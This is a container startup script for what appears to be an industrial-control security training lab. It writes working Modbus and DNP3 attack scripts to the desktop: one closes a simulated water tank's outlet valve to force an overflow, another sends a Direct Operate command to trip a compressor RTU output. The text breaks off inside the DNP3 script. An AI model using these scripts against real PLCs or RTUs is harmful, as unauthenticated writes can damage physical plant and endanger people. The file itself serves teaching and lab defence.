#!/bin/bash
# entrypoint.sh — Kali attack machine container startup
#
# Startup sequence:
#   1. Print device identity and available tools
#   2. Start TigerVNC server on display :1 (port 5901)
#      TigerVNC automatically runs ~/.config/tigervnc/xstartup, which calls
#      dbus-launch --exit-with-session startxfce4. No separate Xfce4 launch needed.
#   3. Wait for VNC socket + TCP readiness (nc probes) before starting websockify
#   4. Start websockify to bridge noVNC WebSocket (port 6080) → VNC TCP (5901)
#   5. Keep the container alive for docker exec terminal sessions
#
# Port map:
#   5901  — VNC TCP (internal; not published to host)
#   6080  — noVNC WebSocket (published to host via Docker Compose port mapping)
#           Accessible in the Electron Desktop view at http://localhost:<hostPort>/vnc.html

set -e

echo "[otforge-attack] =============================================="
echo "[otforge-attack] Device:   ${DEVICE_ID}"
echo "[otforge-attack] Category: ${DEVICE_CATEGORY}"
echo "[otforge-attack] Zone:     External network (attacker-controlled)"
echo "[otforge-attack] =============================================="
echo ""
echo "[otforge-attack] CLI Tools:     nmap, masscan, netcat, tshark, scapy, pymodbus"
echo "[otforge-attack] Frameworks:    metasploit-framework, armitage"
echo "[otforge-attack] Passwords:     hydra, medusa, john, hashcat"
echo "[otforge-attack] ICS Protocol:  pymodbus, dnp3-python, opcua, bacpypes3, python-snap7"
echo "[otforge-attack] Desktop:       Xfce4 via noVNC at container port 6080"
echo "[otforge-attack]                (Wireshark GUI, Armitage, Firefox available)"
echo ""

# ── Network interface report + route repair ───────────────────────────────────
echo "[otforge-attack] Network interfaces:"
ip addr show
echo ""

# On Docker Desktop for Windows, subnet routes for secondary (non-default) network
# interfaces are sometimes absent from the routing table, especially for bridge
# networks created with 'internal: true'. Without these routes, traffic to the
# internet-dmz or ot subnets is sent via the default route (attacker-net) and
# returns EHOSTUNREACH because those hosts are not reachable from that bridge.
#
# Fix: iterate every eth* interface, derive its /24 subnet, and add an explicit
# 'scope link' route for that subnet if one is not already present.
echo "[otforge-attack] Verifying subnet routes for all interfaces..."
for IFACE in $(ip -o link show | awk -F': ' '{print $2}' | grep '^eth'); do
    ADDR=$(ip -4 addr show "$IFACE" 2>/dev/null | awk '/inet /{print $2}' | head -1)
    [ -z "$ADDR" ] && continue
    # Derive network/prefix from the assigned address (e.g., 10.200.50.250/24 → 10.200.50.0/24)
    NETWORK=$(python3 -c "
import ipaddress, sys
try:
    iface = ipaddress.ip_interface('$ADDR')
    print(str(iface.network))
except Exception:
    sys.exit(1)
" 2>/dev/null) || continue
    if ip route show dev "$IFACE" 2>/dev/null | grep -qF "$NETWORK"; then
        echo "[otforge-attack]   $IFACE  $NETWORK  (route OK)"
    else
        ip route add "$NETWORK" dev "$IFACE" 2>/dev/null && \
            echo "[otforge-attack]   $IFACE  $NETWORK  (route ADDED)" || \
            echo "[otforge-attack]   $IFACE  $NETWORK  (route add failed — may need NET_ADMIN)"
    fi
done
echo ""

# ── Firewall gateway route injection ─────────────────────────────────────────
# When a firewall container is present on internet-dmz-net, inject static routes
# for OT, control, and plant-dmz subnets so traffic routes THROUGH the firewall
# container rather than being blocked. This makes nftables deny rules effective —
# without these routes, the only path to OT was the extraNetworks bypass which
# completely bypassed the firewall.
# FW_GW_IP, OT_SUBNET, CONTROL_SUBNET, PLANT_DMZ_SUBNET are injected by
# compose-generator.ts from the effective zone subnets.
if [ -n "${FW_GW_IP}" ]; then
    echo "[otforge-attack] Injecting routes via firewall gateway ${FW_GW_IP}..."
    for SUBNET in "${OT_SUBNET}" "${CONTROL_SUBNET}" "${PLANT_DMZ_SUBNET}"; do
        [ -z "${SUBNET}" ] && continue
        ip route replace "${SUBNET}" via "${FW_GW_IP}" 2>/dev/null && \
            echo "[otforge-attack]   Route added: ${SUBNET} via ${FW_GW_IP}" || \
            echo "[otforge-attack]   Route failed: ${SUBNET} (NET_ADMIN required)"
    done
fi
echo ""

# ── Start TigerVNC server ─────────────────────────────────────────────────────
echo "[otforge-attack] Starting TigerVNC server on display :1 (port 5901)..."

# Clean up any stale lock files from a previous unclean shutdown
rm -f /tmp/.X1-lock /tmp/.X11-unix/X1 2>/dev/null || true

# Geometry matches a standard 16:9 monitor — suitable for Wireshark's layout.
# -SecurityTypes None: password-free VNC — safe because port 5901 is not
#   published to the host; VNC is only reachable via websockify on port 6080.
# -localhost yes: bind VNC to 127.0.0.1 only (not all interfaces) so that newer
#   TigerVNC versions do NOT reject the start-up. websockify connects to
#   localhost:5901, so binding to loopback is sufficient. Using -localhost no with
#   -SecurityTypes None causes TigerVNC ≥ 1.14 to refuse with a security error.
vncserver :1 \
    -geometry 1920x1080 \
    -depth 24 \
    -localhost yes \
    -SecurityTypes None \
    -fg &
VNC_PID=$!

# Wait for VNC socket to appear before starting websockify
for i in $(seq 1 15); do
    if [ -S /tmp/.X11-unix/X1 ] || ss -tln | grep -q ':5901'; then
        echo "[otforge-attack] VNC server ready (attempt ${i})"
        break
    fi
    sleep 1
done

# ── Xfce4 is launched via VNC xstartup, not here ─────────────────────────────
# TigerVNC automatically executes ~/.config/tigervnc/xstartup after creating the
# X session. That script runs `dbus-launch --exit-with-session startxfce4`, which
# is the correct single launch path.
#
# We deliberately do NOT start startxfce4 here. A second call would start a second
# Xfce4 instance on the same display — its xfwm4 would fail with "Another Window
# Manager is already running", leaving the desktop without titlebars and resize handles.

# Wait for TigerVNC to actually accept TCP connections on port 5901 before starting
# websockify. The socket-file / port check above confirmed VNC started, but there is
# a brief window where TigerVNC has the socket open but rejects incoming connections
# while it finishes initialising the X session. A TCP connection probe is more
# reliable than a sleep-based heuristic.
echo "[otforge-attack] Waiting for VNC to accept TCP connections on port 5901..."
for i in $(seq 1 20); do
    # Try a TCP connection; nc exits 0 immediately on success, 1 on refused/timeout
    if nc -z -w1 localhost 5901 2>/dev/null; then
        echo "[otforge-attack] VNC accepting connections (attempt ${i})"
        break
    fi
    sleep 1
done

# ── Start noVNC WebSocket bridge ─────────────────────────────────────────────
# websockify translates WebSocket frames from the Electron BrowserWindow (noVNC page)
# into raw VNC TCP frames that TigerVNC understands. The --wrap-mode=ignore flag
# prevents websockify from exiting when the VNC connection drops (e.g. client refresh).
echo "[otforge-attack] Starting noVNC websockify bridge on port 6080..."
websockify \
    --web /opt/novnc/ \
    --wrap-mode=ignore \
    0.0.0.0:6080 \
    localhost:5901 &
NOVNC_PID=$!

# Verify websockify is listening on port 6080 before declaring the container ready.
# Without this check the host-side isPortOpen() probe may succeed while websockify
# is still in its startup phase and the WebSocket handshake fails.
echo "[otforge-attack] Waiting for noVNC websockify to listen on port 6080..."
for i in $(seq 1 15); do
    if nc -z -w1 localhost 6080 2>/dev/null; then
        echo "[otforge-attack] noVNC ready on port 6080 (attempt ${i})"
        break
    fi
    sleep 1
done

echo "[otforge-attack] Desktop ready — connect at container port 6080"
echo "[otforge-attack] VNC: no password required (SecurityTypes None; isolated within Docker network)"
echo ""
echo "[otforge-attack] Waiting for terminal sessions (docker exec)..."

# ── Create Attack_Scripts desktop directory ───────────────────────────────────
# Populate /root/Desktop/Attack_Scripts/ with ready-to-run pymodbus scripts so
# students can immediately interact with the PLC without writing any code.
# PLC_IP and PLC_PORT are injected by compose-generator.ts from the scenario's
# first PLC device; scripts read them from the environment at runtime.

mkdir -p /root/Desktop/Attack_Scripts

# ── Shared raw-socket Modbus helpers ─────────────────────────────────────────
# All four attack scripts use raw Python sockets instead of pymodbus. This
# avoids pymodbus 3.x strict Transaction-ID validation, which rejects OpenPLC
# responses because OpenPLC echoes TID=0 regardless of the request TID.  Raw
# sockets send TID=0 and accept whatever the server returns, matching OTForge's
# own Modbus implementation in the main process.
#
# Each function opens its own short-lived TCP connection so there is no
# persistent connection state that can desynchronise between calls.
#
# Modbus TCP address map for Tutorial 01 (pump_control.st):
#   FC01/FC05  Coil 0  pump_run    %QX0.0  — inlet pump   (TRUE = running)
#   FC01/FC05  Coil 1  valve_open  %QX0.1  — outlet valve (TRUE = open)
#   FC01/FC05  Coil 2  emrg_stop   %QX0.2  — emergency stop
#   FC03/FC06  HR 0    tank_level  %QW0    — tank level in cm (0–1000)
#   FC03       HR 1    inlet_flow  %QW1    — inlet flow L/min
#   FC03       HR 2    outlet_flow %QW2    — outlet flow L/min
#
# Attack goal: write Coil 1 (valve_open) → FALSE to CLOSE the outlet drain.
# With the inlet pump still running, inflow > 0 and outflow = 0 → tank fills.

# ── read_coils.py ─────────────────────────────────────────────────────────────
cat > /root/Desktop/Attack_Scripts/read_coils.py << 'PYEOF'
#!/usr/bin/env python3
"""
read_coils.py — Read PLC coil and holding-register state via raw Modbus TCP.

Usage:
    python3 read_coils.py

Environment variables (injected automatically by the OTForge simulation):
    PLC_IP    IP address of the target PLC  (default: 10.200.10.10)
    PLC_PORT  Modbus TCP port               (default: 502)

Coil map (Tutorial 01 — pump_control program):
    Coil 0  pump_run     FALSE=inlet pump OFF,    TRUE=inlet pump ON
    Coil 1  valve_open   FALSE=outlet valve CLOSED, TRUE=outlet valve OPEN
    Coil 2  emrg_stop    FALSE=normal,             TRUE=emergency stop tripped

Holding register map (OpenPLC %QW output words start at Modbus HR address 0):
    HR 0  tank_level   Tank fill level in cm  (500=5.00 m, 1000=10.00 m = overflow)
    HR 1  inlet_flow   Inlet flow rate in L/min  (>0 when inlet pump is running)
    HR 2  outlet_flow  Outlet flow rate in L/min (>0 when outlet valve is open)
"""

import os, sys, socket, struct

PLC_IP   = os.environ.get('PLC_IP',   '10.200.10.10')
PLC_PORT = int(os.environ.get('PLC_PORT', '502'))

COIL_LABELS = {
    0: 'pump_run    (inlet pump)',
    1: 'valve_open  (outlet valve)',
    2: 'emrg_stop   (emergency stop)',
}
REG_LABELS = {
    0: 'tank_level   (cm)',
    1: 'inlet_flow   (L/min)',
    2: 'outlet_flow  (L/min)',
}

# ── Raw Modbus TCP helpers ────────────────────────────────────────────────────
def _mb_req(ip, port, pdu_body, unit=1):
    """Open a fresh TCP connection, send one Modbus TCP frame, return response bytes."""
    pdu   = bytes([unit]) + pdu_body
    frame = struct.pack('>HHH', 0, 0, len(pdu)) + pdu  # TID=0, Proto=0, Length
    try:
        with socket.create_connection((ip, port), timeout=5) as s:
            s.sendall(frame)
            return s.recv(256)
    except OSError as e:
        print(f"[error] socket error: {e}")
        return b''

def read_coils(ip, port, start, count, unit=1):
    pdu  = struct.pack('>BHH', 0x01, start, count)
    resp = _mb_req(ip, port, pdu, unit)
    # Response: MBAP(6) + Unit(1) + FC(1) + ByteCount(1) + data
    need = 9 + (count + 7) // 8
    if len(resp) < need or resp[7] != 0x01:
        return None
    bits = []
    for i in range(count):
        bits.append(bool((resp[9 + i // 8] >> (i % 8)) & 1))
    return bits

def read_holding_registers(ip, port, start, count, unit=1):
    pdu  = struct.pack('>BHH', 0x03, start, count)
    resp = _mb_req(ip, port, pdu, unit)
    need = 9 + count * 2
    if len(resp) < need or resp[7] != 0x03:
        return None
    return list(struct.unpack_from(f'>{count}H', resp, 9))

# ── FC01: Read Coils 0–2 ──────────────────────────────────────────────────────
print(f"[*] Connecting to PLC at {PLC_IP}:{PLC_PORT} ...")

coils = read_coils(PLC_IP, PLC_PORT, start=0, count=3)
if coils is None:
    print("[error] FC01 Read Coils failed — is the simulation running?")
    sys.exit(1)

print(f"[+] Connected\n")
print("=== COILS  (Modbus FC01 — Read Coils) ===")
for idx, state in enumerate(coils):
    label  = COIL_LABELS.get(idx, f'coil_{idx}')
    marker = "ON  (TRUE) " if state else "OFF (FALSE)"
    print(f"  Coil {idx}  {label:<35} {marker}")

print()

# ── FC03: Read Holding Registers 0–2 (%QW0–%QW2) ─────────────────────────────
print("=== HOLDING REGISTERS  (Modbus FC03 — Read Holding Registers) ===")
regs = read_holding_registers(PLC_IP, PLC_PORT, start=0, count=3)
if regs is None:
    print("[error] FC03 Read Holding Registers failed")
    sys.exit(1)

for idx, raw in enumerate(regs):
    label   = REG_LABELS.get(idx, f'reg_{idx}')
    display = f"{raw} cm  ({raw / 100.0:.2f} m)" if idx == 0 else str(raw)
    print(f"  HR{idx}  {label:<35} {display}")

print()
print("[+] Done — no writes performed")
PYEOF

# ── write_coil.py ─────────────────────────────────────────────────────────────
# Default (no args): ATTACK — closes the outlet valve (Coil 1 → FALSE).
#   With the inlet pump still running (Coil 0 = TRUE), inflow > outflow and
#   the tank level rises.  Watch HR 0 climb and the Water Tank canvas
#   animation fill up.
#
# --restore: re-opens the outlet valve (Coil 1 → TRUE).
#   Inlet pump is left untouched.  Inflow = outflow → level stabilises.
#
# Uses raw TCP sockets (no pymodbus) to avoid TID-validation errors that
# appear with some pymodbus 3.x versions against OpenPLC.
cat > /root/Desktop/Attack_Scripts/write_coil.py << 'PYEOF'
#!/usr/bin/env python3
"""
write_coil.py — Modbus coil write attack against the Tutorial 01 water treatment PLC.

Default action  (no flags):  ATTACK  — close the outlet valve (Coil 1 → FALSE).
                              The inlet pump keeps running, so water flows in with
                              no path out.  The PLC physics loop accumulates the
                              level — watch HR 0 (tank_level) rise in the OT
                              canvas animation and in the terminal progress bar.

With --restore:              RESTORE — re-open the outlet valve (Coil 1 → TRUE).
                              Inlet pump is not touched; with both pump and valve
                              TRUE, inflow = outflow and the level stabilises.
                              Run plc_init.py to reset the level to 500 cm.

This replicates the 2021 Oldsmar, Florida water treatment attack technique:
Modbus TCP carries no authentication — any host on the OT network can write
any coil or register on any PLC with zero credentials required.

Usage:
    python3 write_coil.py           # execute attack → watch tank rise
    python3 write_coil.py --restore # restore safe state

Environment variables (injected automatically by the OTForge simulation):
    PLC_IP    IP address of the target PLC  (default: 10.200.10.10)
    PLC_PORT  Modbus TCP port               (default: 502)
"""

import os, sys, socket, struct, time

RESTORE_MODE = '--restore' in sys.argv

PLC_IP   = os.environ.get('PLC_IP',   '10.200.10.10')
PLC_PORT = int(os.environ.get('PLC_PORT', '502'))

# ── Raw Modbus TCP helpers ────────────────────────────────────────────────────
def _mb_req(ip, port, pdu_body, unit=1):
    """Send one Modbus TCP frame on a fresh connection; return response bytes."""
    pdu   = bytes([unit]) + pdu_body
    frame = struct.pack('>HHH', 0, 0, len(pdu)) + pdu
    try:
        with socket.create_connection((ip, port), timeout=5) as s:
            s.sendall(frame)
            return s.recv(256)
    except OSError:
        return b''

def write_coil(ip, port, address, value, unit=1):
    """FC05: Write Single Coil. Returns True on ACK."""
    pdu  = struct.pack('>BHH', 0x05, address, 0xFF00 if value else 0x0000)
    resp = _mb_req(ip, port, pdu, unit)
    return len(resp) >= 8 and resp[7] == 0x05

def read_register(ip, port, address, unit=1):
    """FC03: Read one Holding Register. Returns int value or None on error."""
    pdu  = struct.pack('>BHH', 0x03, address, 1)
    resp = _mb_req(ip, port, pdu, unit)
    if len(resp) < 11 or resp[7] != 0x03:
        return None
    return struct.unpack_from('>H', resp, 9)[0]

# ── Mode / target summary ─────────────────────────────────────────────────────
if RESTORE_MODE:
    VALVE_STATE = True
    mode_label  = "RESTORE — re-open outlet valve (inlet pump not touched)"
else:
    VALVE_STATE = False
    mode_label  = "ATTACK  — outlet valve CLOSED (tank overflow via physics sim)"

print(f"[*] Mode:      {mode_label}")
print(f"[*] Target:    {PLC_IP}:{PLC_PORT}")
print(f"[*] Coil 1 (valve_open) → {'TRUE  (valve OPEN)'  if VALVE_STATE else 'FALSE (valve CLOSED)'}")
print()

# ── FC05: Write Coil 1 (valve_open) ──────────────────────────────────────────
# ATTACK:  valve_open → FALSE closes the outlet drain.
#          Inlet pump keeps running (Coil 0 = TRUE, unchanged).
#          inlet_flow = 120 L/min, outlet_flow = 0 → level rises 5 cm/scan.
#
# RESTORE: valve_open → TRUE re-opens the outlet drain.
#          inlet_flow = outlet_flow = 120 → balanced → level stabilises.
print(f"[*] Sending Modbus FC05 (Write Single Coil) to {PLC_IP}:{PLC_PORT} ...")
if not write_coil(PLC_IP, PLC_PORT, address=1, value=VALVE_STATE):
    print("[error] FC05 write failed — is the simulation running?")
    sys.exit(1)

state_str = "TRUE  (OPEN)  " if VALVE_STATE else "FALSE (CLOSED)"
print(f"[+] Coil 1 (valve_open) → {state_str} — FC05 ACK'd\n")

# ── Progress bar helper ───────────────────────────────────────────────────────
def _bar(level):
    lvl = max(0, min(level, 1000))
    pct = lvl / 10.0
    n   = int(pct / 5)
    bar = '█' * n + '░' * (20 - n)
    if   pct < 50:  tag = "NORMAL  "
    elif pct < 80:  tag = "ELEVATED"
    elif pct < 100: tag = "CRITICAL"
    else:           tag = "OVERFLOW"
    return f"  [{bar}] {lvl:4d} cm  ({pct:5.1f}%)  {tag}"

if not RESTORE_MODE:
    # ── ATTACK mode — monitor rising level ───────────────────────────────────
    print("[+] ATTACK COMPLETE — PLC is now in an unsafe state.")
    print("    Coil 1 = FALSE (outlet valve CLOSED)  |  Coil 0 = TRUE (inlet pump ON)")
    print("    Water is accumulating — overflow at 1000 cm (approx. 5 min).")
    print("    To restore:  python3 write_coil.py --restore")
    print()
    print("[*] Monitoring HR 0 (tank_level) — watch it rise.")
    print("[*] The Water Tank icon on the OT canvas also animates the fill level.")
    print("[*] Press Ctrl+C to stop monitoring (attack stays active).\n")
    try:
        while True:
            lvl = read_register(PLC_IP, PLC_PORT, address=0)
            if lvl is not None:
                lvl = min(lvl, 1000)
                print(f"\r{_bar(lvl)}", end='', flush=True)
                if lvl >= 1000:
                    print("\n")
                    print("[!] OVERFLOW — tank at 1000 cm (10.00 m)!")
                    print("[!] Run  python3 write_coil.py --restore  to recover.")
                    break
            time.sleep(0.5)
    except KeyboardInterrupt:
        print()
        print("[*] Monitoring stopped — attack is still active.")
else:
    # ── RESTORE mode ─────────────────────────────────────────────────────────
    print("[+] Outlet valve restored to OPEN.")
    print("    Coil 1 = TRUE (outlet valve OPEN)  |  Coil 0 unchanged (inlet pump ON)")
    lvl = read_register(PLC_IP, PLC_PORT, address=0)
    if lvl is not None:
        print(f"\n[*] Current tank_level: {lvl} cm")
        print(f"[*] {_bar(lvl)}")
    print()
    print("[*] Flow is balanced — level will stabilise at its current value.")
    print("[*] To reset tank to 500 cm baseline:  python3 plc_init.py")
PYEOF

chmod +x /root/Desktop/Attack_Scripts/read_coils.py
chmod +x /root/Desktop/Attack_Scripts/write_coil.py

# ── plc_init.py ────────────────────────────────────────────────────────────────
# Seeds the PLC to its safe operating baseline via raw Modbus TCP.
# Called automatically in the background at container start, and available
# manually from the Kali Desktop after an attack to reset without restarting.
#
# Baseline state:
#   Coil 0 (pump_run)   → TRUE  — inlet pump ON
#   Coil 1 (valve_open) → TRUE  — outlet valve OPEN
#   HR 0 (tank_level)    → 500  — tank at 50% (5.00 m)
#
# With both coils TRUE, inlet_flow = outlet_flow = 120 L/min → balanced →
# tank_level stays stable at 500 cm. Writing HR 0 = 500 directly resets
# the displayed level without restarting the simulation.
cat > /root/Desktop/Attack_Scripts/plc_init.py << 'PYEOF'
#!/usr/bin/env python3
"""
plc_init.py — Seed the PLC to its safe operating baseline via raw Modbus TCP.

Called automatically at container start; also available for manual re-seeding
after an attack without restarting the full simulation.

Writes:
  Coil 0 (pump_run)    → TRUE   inlet pump ON   (%QX0.0)
  Coil 1 (valve_open)  → TRUE   outlet valve OPEN (%QX0.1)
  HR 0 (tank_level)    → 500    tank at 50% baseline (%QW0)

With pump_run=TRUE and valve_open=TRUE the flow is balanced (inlet=outlet=120
L/min) so tank_level stays at 500 cm until the attack writes valve_open=FALSE.

Environment variables (injected automatically by OTForge):
    PLC_IP    IP address of the target PLC  (default: 10.200.10.10)
    PLC_PORT  Modbus TCP port               (default: 502)
"""

import os, sys, socket, struct

PLC_IP   = os.environ.get('PLC_IP',   '10.200.10.10')
PLC_PORT = int(os.environ.get('PLC_PORT', '502'))

def _mb_req(ip, port, pdu_body, unit=1):
    pdu   = bytes([unit]) + pdu_body
    frame = struct.pack('>HHH', 0, 0, len(pdu)) + pdu
    try:
        with socket.create_connection((ip, port), timeout=5) as s:
            s.sendall(frame)
            return s.recv(256)
    except OSError:
        return b''

def write_coil(ip, port, address, value, unit=1):
    pdu  = struct.pack('>BHH', 0x05, address, 0xFF00 if value else 0x0000)
    resp = _mb_req(ip, port, pdu, unit)
    return len(resp) >= 8 and resp[7] == 0x05

def write_register(ip, port, address, value, unit=1):
    """FC06: Write Single Register."""
    pdu  = struct.pack('>BHH', 0x06, address, value)
    resp = _mb_req(ip, port, pdu, unit)
    return len(resp) >= 8 and resp[7] == 0x06

success = True

# ── Coil 0: pump_run → TRUE (inlet pump ON) ──────────────────────────────────
if write_coil(PLC_IP, PLC_PORT, address=0, value=True):
    print("[plc-init] Coil 0 (pump_run)    → TRUE  (inlet pump ON)")
else:
    print(f"[plc-init] write_coil(0) failed — PLC at {PLC_IP}:{PLC_PORT} not responding")
    success = False

# ── Coil 1: valve_open → TRUE (outlet valve OPEN) ────────────────────────────
if write_coil(PLC_IP, PLC_PORT, address=1, value=True):
    print("[plc-init] Coil 1 (valve_open)  → TRUE  (outlet valve OPEN)")
else:
    print(f"[plc-init] write_coil(1) failed")
    success = False

# ── HR 0: tank_level → 500 (50% baseline) ────────────────────────────────────
# OpenPLC %QW0 → Modbus HR 0.
if write_register(PLC_IP, PLC_PORT, address=0, value=500):
    print("[plc-init] HR 0 (tank_level)    → 500   (50% baseline, 5.00 m)")
else:
    print(f"[plc-init] write_register(0) failed")
    success = False

if success:
    print("[plc-init] PLC baseline state seeded successfully.")
    sys.exit(0)
else:
    print("[plc-init] One or more writes failed — baseline may be incomplete.")
    sys.exit(1)
PYEOF

chmod +x /root/Desktop/Attack_Scripts/plc_init.py

# ── monitor_level.py ──────────────────────────────────────────────────────────
# Live ASCII bar graph of HR 0 (tank_level). Run in a second terminal
# alongside write_coil.py to watch the level rise numerically.
cat > /root/Desktop/Attack_Scripts/monitor_level.py << 'PYEOF'
#!/usr/bin/env python3
"""
monitor_level.py — Live tank-level monitor using raw Modbus TCP.

Polls HR 0 (%QW0 = tank_level), HR 1 (inlet_flow), and HR 2
(outlet_flow) every second and prints a continuously-updating ASCII bar.

Usage:
    python3 monitor_level.py           # poll every 1 s (default)
    python3 monitor_level.py --fast    # poll every 0.5 s
    Press Ctrl+C to stop.

Environment variables (injected automatically by OTForge):
    PLC_IP    IP address of the target PLC  (default: 10.200.10.10)
    PLC_PORT  Modbus TCP port               (default: 502)
"""

import os, sys, socket, struct, time

PLC_IP   = os.environ.get('PLC_IP',   '10.200.10.10')
PLC_PORT = int(os.environ.get('PLC_PORT', '502'))
INTERVAL = 0.5 if '--fast' in sys.argv else 1.0

def _mb_req(ip, port, pdu_body, unit=1):
    pdu   = bytes([unit]) + pdu_body
    frame = struct.pack('>HHH', 0, 0, len(pdu)) + pdu
    try:
        with socket.create_connection((ip, port), timeout=5) as s:
            s.sendall(frame)
            return s.recv(256)
    except OSError:
        return b''

def read_registers(ip, port, start, count, unit=1):
    pdu  = struct.pack('>BHH', 0x03, start, count)
    resp = _mb_req(ip, port, pdu, unit)
    if len(resp) < 9 + count * 2 or resp[7] != 0x03:
        return None
    return list(struct.unpack_from(f'>{count}H', resp, 9))

print(f"[*] Connecting to {PLC_IP}:{PLC_PORT} — polling HR 0–2 every {INTERVAL:.1f} s")
print(f"[*] Press Ctrl+C to stop.\n")
print(f"  {'LEVEL BAR':^42}  LEVEL    PCT    IN     OUT    STATUS")
print(f"  {'─'*42}  {'─'*6}  {'─'*5}  {'─'*6}  {'─'*6}  {'─'*8}")

try:
    while True:
        regs = read_registers(PLC_IP, PLC_PORT, start=0, count=3)
        if regs:
            lvl    = min(regs[0], 1000)
            q_in   = regs[1]
            q_out  = regs[2]
            pct    = lvl / 10.0
            n      = int(pct / 5)
            bar    = '█' * n + '░' * (20 - n)
            status = ("NORMAL  " if pct < 50 else
                      "ELEVATED" if pct < 80 else
                      "CRITICAL" if pct < 100 else "OVERFLOW")
            print(f"\r  [{bar}]  {lvl:4d}cm  {pct:5.1f}%  "
                  f"{q_in:5d}  {q_out:5d}  {status}", end='', flush=True)
        else:
            print("\r  [no response — is the simulation running?]", end='', flush=True)
        time.sleep(INTERVAL)
except KeyboardInterrupt:
    print("\n[*] Monitoring stopped.")
PYEOF

chmod +x /root/Desktop/Attack_Scripts/monitor_level.py

# ── dnp3_attack.py ─────────────────────────────────────────────────────────────
# Lab 03: DNP3 Direct Operate attack against a compressor RTU.
# Sends FC 03 (Direct Operate) to Binary Output 0 on a DNP3 outstation — the
# same command an authorized SCADA master would send, but from an unauthorized
# source. Requires no credentials; DNP3 has no built-in authentication.
cat > /root/Desktop/Attack_Scripts/dnp3_attack.py << 'PYEOF'
#!/usr/bin/env python3
"""
dnp3_attack.py — DNP3 Direct Operate attack against a compressor RTU.

Sends Function Code 03 (Direct Operate) for Binary Output 0 to the target
DNP3 outstation. In ICS Lab 03 (Ironhorse Midstream), Binary Output 0 on
RTU-2 (outstation address 11) controls the Compressor B contactor relay.

Usage:
    python3 dnp3_attack.py <rtu-ip> [--outstation 11] [--port 20000] [--on]

Examples:
    python3 dnp3_attack.py 10.200.10.11
    python3 dnp3_attack.py 10.200.10.11 --outstation 11 --on
"""

import argparse
import socket
import struct
import sys
import os


# ── DNP3 CRC-16/DNP ──────────────────────────────────────────────────────────

def _build_crc_table():
    """Pre-compute the 256-entry CRC-16/DNP lookup table (polynomial 0xA6BC)."""
    table = []
    for i in range(256):
        crc = i
        for _ in range(8):
            crc = (crc >> 1) ^ 0xA6BC if crc & 1 else crc >> 1
        table.append(crc)
    return table

_CRC_TABLE = _build_crc_table()


def crc16(data):
    """Compute CRC-16/DNP checksum over data bytes."""
    crc = 0
    for byte in data:
        crc = (crc >> 8) ^ _CRC_TABLE[(crc ^ byte) & 0xFF]
    return crc ^ 0xFFFF


def crc_le(data):
    """Return 2-byte little-endian CRC for a data block."""
    return struct.pack("<H", crc16(data))


# ── Link layer ─────────────────────────────────────────────────────────────────

def build_link_frame(ctrl, dest, src, payload):
    """
    Encode a complete DNP3 link-layer frame.

    Link header: 0x05 0x64 | length | ctrl | dest(2LE) | src(2LE) | crc(2)
    Payload is split into 16-byte blocks, each followed by a 2-byte CRC.
    """
    data_len = 5 + len(payload)
    header = bytes([0x05, 0x64, data_len, ctrl]) + struct.pack("<HH", dest, src)
    frame = header + crc_le(header)
    for i in range(0, len(payload), 16):
        block = payload[i : i + 16]
        frame += block + crc_le(block)
    return frame


# ── Application layer ──────────────────────────────────────────────────────────

def build_direct_operate(app_seq, outstation_addr, master_addr, bo_index=0, latch_on=False):
    """
    Build a DNP3 Direct Operate frame (FC 03) for Group 12 Var 1 (CROB).

    CROB (Control Relay Output Block) is the standard DNP3 object for
    commanding binary outputs. This function commands Binary Output bo_index
    to LATCH_ON (True) or LATCH_OFF (False).

    FC 03 is a confirmed operate — the outstation is expected to send back
    a response confirming the operate. FC 04 (Direct Operate No Ack) skips
    the response step.
    """
    # CROB control code: 0x03=LATCH_ON, 0x04=LATCH_OFF
    control_code = 0x03 if latch_on else 0x04

    # Application layer: header + object
    app_data = bytes([
        0xC0 | (app_seq & 0x0F),   # FIR=1, FIN=1, CON=0, UNS=0, SEQ
        0x03,                       # Function Code 3: Direct Operate
        12, 1, 0x28, 1,             # G12V1, qualifier 0x28 = 8-bit count+idx prefix, count=1
        bo_index,                   # Binary Output index (0 = first output)
        control_code,               # CROB control code (LATCH_ON or LATCH_OFF)
        0x01,                       # Repeat count = 1
        0x64, 0x00, 0x00, 0x00,    # onTime  = 100 ms (little-endian uint32)
        0x64, 0x00, 0x00, 0x00,    # offTime = 100 ms (little-endian uint32)
        0x00,                       # Status byte (cleared in request)
    ])

    # Transport layer: FIR=1, FIN=1 (single-segment message), SEQ=0
    transport = bytes([0xC0]) + app_data

    # Link layer: ctrl=0xC4 → DIR=1 (master→outstation), PRM=1, FC=4 UNCONFIRMED_DATA
    return build_link_frame(0xC4, outstation_addr, master_addr, transport)


# ── Attack ────────────────────────────────────────────────────────────────────

def run_attack(host, port, outstation_addr, master_addr, bo_index, latch_on, timeout):
    """Connect to the target RTU and send a Direct Operate command."""
    op = "LATCH_ON (activate output)" if latch_on else "LATCH_OFF (trip output)"
    print(f"[dnp3-attack] Target:     {host}:{port}")
    print(f"[dnp3-attack] Outstation: {outstation_addr}  Master: {master_addr}")
    print(f"[dnp3-attack] Command:    Direct Operate (FC 03) → Binary Output {bo_index} → {op}")
    print()
    print("[dnp3-attack] NOTE: DNP3 requires no credentials — any host on the OT network")
    print("[dnp3-attack] can send this command. This is what makes the attack possible.")
    print()

    # Step 1: TCP connect
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((host, port))
    except ConnectionRefusedError:
        print(f"[dnp3-attack] ERROR: Connection refused — {host}:{port} is not reachable.")
        print("[dnp3-attack] If an IPS reject rule is active, this is the expected result!")
        sys.exit(2)
    except socket.timeout:
        print(f"[dnp3-attack] ERROR: Connection timed out after {timeout}s.")
        sys.exit(1)
    except OSError as exc:
        print(f"[dnp3-attack] ERROR: {exc}")
        sys.exit(1)

    print(f"[dnp3-attack] TCP connection established to {host}:{port}")

    # Step 2: Build and send the Direct Operate frame
    frame = build_direct_operate(
        app_seq=0,
        outstation_addr=outstation_addr,
        master_addr=master_addr,
        bo_index=bo_index,
        latch_on=latch_on,
    )
    print(f"[dnp3-attack] Sending Direct Operate frame ({len(frame)} bytes):")
    print(f"[dnp3-attack]   Start bytes:    05 64  (DNP3 sync)")
    print(f"[dnp3-attack]   Function code:  03     (Direct Operate)")
    print(f"[dnp3-attack]   Object type:    G12V1  (Control Relay Output Block)")
    print(f"[dnp3-attack]   Full frame hex: {frame.hex(' ')}")
    print()
    sock.sendall(frame)
    print("[dnp3-attack] Direct Operate packet transmitted — waiting for response ...")

    # Step 3: Read response (outstation may or may not send one)
    try:
        resp_header = sock.recv(10)
        if resp_header and resp_header[:2] == b"\x05\x64":
